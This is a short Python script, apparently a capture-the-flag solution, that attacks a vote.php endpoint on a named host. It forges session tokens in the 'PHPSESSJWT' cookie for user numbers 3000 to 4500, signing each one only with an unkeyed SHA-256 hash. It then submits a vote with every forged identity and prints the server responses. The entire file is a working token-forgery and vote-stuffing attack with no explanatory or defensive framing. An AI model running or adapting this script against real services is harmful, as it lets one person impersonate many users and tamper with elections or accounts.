import requests
import string
import base64
import hashlib

headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8; charset=UTF-8'}
data = {'music_no':'326'}
for i in range(3000,4500):
    url = "http://ch4n3.me:8080/xmas/vote.php"
    shadata = "{\"alg\":\"sha256\",\"typ\":\"JWT\"}{\"user_no\":"+str(i)+"}"
    encode_hash = shadata.encode()
    encode_hash = hashlib.sha256(encode_hash).hexdigest()
    encode_hash = "." + encode_hash
    numdata = "{\"alg\":\"sha256\",\"typ\":\"JWT\"}.{\"user_no\":"+str(i)+"}"
    encodeData = base64.b64encode(numdata.encode('utf-8'))
    encodeData2 = base64.b64encode(encode_hash.encode('utf-8'))
    payload=encodeData + encodeData2
    cookies = {'PHPSESSJWT':payload.decode('utf-8')}
    print(cookies)
    response = requests.post(url, data=data, headers=headers, cookies=cookies)
    print(response.text)
